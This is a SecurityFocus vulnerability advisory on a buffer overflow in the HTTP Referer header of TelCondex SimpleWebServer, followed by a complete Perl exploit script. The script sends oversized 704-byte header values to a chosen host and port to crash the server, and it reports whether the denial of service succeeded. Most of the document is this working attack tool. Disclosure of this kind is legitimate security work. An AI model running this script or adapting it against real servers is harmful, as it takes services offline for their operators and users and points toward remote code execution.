source: http://www.securityfocus.com/bid/8925/info

A vulnerability has been reported in SimpleWebServer that may allow a remote attacker to cause a denial of service condition or execute arbitrary code on vulnerable host. The issue is reported to exist due to a lack of bounds checking by software, leading to a buffer overflow condition. The problem is reported to exist due to the HTTP referer header. It has been reported that an attacker may be able to crash the server by sending 700 bytes of data through the HTTP referer header and overwrite the return address on the stack with 704 bytes.

Successful exploitation of this issue may allow an attacker to cause a denial of service condition or execute arbitrary code in the context of the web server in order to gain unauthorized access to a vulnerable system.

SimpleWebServer version 2.12.30210 Build 3285 has been reported to be prone to this issue, however other versions may be affected as well.

#!/usr/local/bin/perl
#                     TelCondex WebServer: Buffer overflow
#                     ------------------------------------
#
# Vendor:     TelCondex SimpleWebserver(tc.SimpleWebServer)
# Version:    2.12.30210 Build 3285
# Discoverer: Oliver Karow<oliver.karow@gmx.de>
# Exploit:    DoS(Denial Of Service) By Blade<blade@abez.org>
# Solution:   Download Fixed 
Version<http://www.telcondex.de/pub/sws_default.htm>
#                  <FiH eZine 2003 - http://www.fihezine.tsx.to>
####################################################################################
        use IO::Socket;

 print '
 TelCondex Webserver DoS Exploit - 
http://securityfocus.com/archive/1/342785
 Programmer: Blade<blade@abez.org> - Discoverer: 
Oliver.K.<oliver.karow@gmx.de>
          FiH eZiNe 2002<>2003 - http://www.fihezine.tsx.to\n
                    Usage: TelCondex.pl <HostVulnerable> [Port]
 ';

        $server = $ARGV[0];
        if ($ARGV[1] == 0){ $port=80; } else { $port=$ARGV[1]; }

        print" Connecting...";
        $Sock=IO::Socket::INET->new(Proto=>"tcp", 
PeerAddr=>$server,PeerPort=>$port, Timeout=>5);
        if ($Sock){
        print" Conected...";
        $Sock->autoflush(1);

        print $Sock "GET / HTTP/1.1\r\n".
                     "Accept: */* \r\n".
                     "Referer: ". ("A" x 704) ."\r\n".
                     "Host: ". ("A" x 704) ."\r\n".
                     "Accept-Language: ". ("A" x 704) ."\r\n\r\n";
        @Respost=<$Sock>;
        close($Sock);
        if (@Respost == 0){die " D.o.S Completed!\n";} else { print " D.o.S 
Not Completed"; }
        }else{ print"Impossible to connect from $server"; }
